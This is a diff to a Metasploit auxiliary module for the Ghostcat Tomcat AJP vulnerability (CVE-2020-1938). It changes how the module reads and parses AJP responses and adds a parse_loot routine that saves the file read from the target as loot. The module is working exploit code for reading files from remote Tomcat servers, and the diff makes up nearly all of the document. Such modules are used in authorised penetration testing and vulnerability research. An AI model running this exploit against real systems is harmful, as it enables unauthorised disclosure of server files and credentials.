@@ -1,6 +1,6 @@
 class MetasploitModule < Msf::Auxiliary
     include Msf::Exploit::Remote::Tcp
-
+    include Msf::Auxiliary::Report
     def initialize(info = {})
         super(update_info(info,
             "Name" => "Ghostcat",
@@ -17,8 +17,7 @@ class MetasploitModule < Msf::Auxiliary
                 [
                     [ "CVE", "2020-1938"]
                 ],
-            "Privileged" => false,
-            "Platform" => %w{ java linux win},
+            'DisclosureDate' => '2020-02-20',
             ))
         register_options(
             [
@@ -166,9 +165,9 @@ class MetasploitModule < Msf::Auxiliary
         begin
             connect(true, {'RHOST'=>"#{datastore['RHOST'].to_s}", 'RPORT'=>datastore['RPORT'].to_i, 'SSL'=>datastore['SSL']})
             sock.put(data)
-            buf = sock.get_once || ""
+            buf = sock.get(30) || ""
         rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
-            elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+            elog('Error socket', error: e)
         ensure
             disconnect
         end
@@ -178,7 +177,7 @@ class MetasploitModule < Msf::Auxiliary
     def read_buf_string(buf, idx)
         len = buf[idx..(idx+2)].unpack('n')[0]
         idx += 2
-        print "#{buf[idx..(idx+len)]}"
+        $content += "#{buf[idx..(idx+len)]}"
         idx += len + 1
         idx
     end
@@ -201,24 +200,26 @@ class MetasploitModule < Msf::Auxiliary
         idx += 2
         if buf[idx] == "\x04"
             idx += 1
-            print "Status Code: "
+            $content = "Status Code: "
             idx += 2
             idx = read_buf_string(buf, idx)
-            print("\n")
+            $content += "\n"
             header_num = buf[idx..(idx+2)].unpack('n')[0]
             idx += 2
             for i in 1..header_num
                 if buf[idx] == "\xA0"
                     idx += 1
-                    print "#{common_response_headers[buf[idx]]}: "
+                    $content += "#{common_response_headers[buf[idx]]}: "
                     idx += 1
                     idx = read_buf_string(buf, idx)
                 else
                     idx = read_buf_string(buf, idx)
-                    print(": ")
+                    $content += ": "
+
                     idx = read_buf_string(buf, idx)
                 end
-                print("\n")
+                $content += "\n"
+
             end
         elsif buf[idx] == "\x05"
             return 0
@@ -231,7 +232,16 @@ class MetasploitModule < Msf::Auxiliary
 
         parse_response(buf, idx)
     end
-
+    def parse_loot(content)
+        content_type = $content.match(/Content-Type: .*/).to_s.split(/ /)[1]
+        content_length = $content.match(/Content-Length: .*/).to_s.split(/ /)[1]
+        data = $content[-(content_length.to_i+1)..]
+        file = store_loot(
+            datastore['FILENAME'].to_s, content_type, datastore['RHOST'].to_s,
+            data, "Ghostcat File Read/Inclusion", "Read file", datastore['FILENAME']
+          )
+        print_good file
+    end
     def run
         headers = Array.new
         method = "GET"
@@ -244,7 +254,7 @@ class MetasploitModule < Msf::Auxiliary
         data = make_forward_request_package(method, headers, attributes)
         buf = send_recv_once(data)
         parse_response(buf, 0)
+        print $content
+        parse_loot($content)
     end
 end
-
-
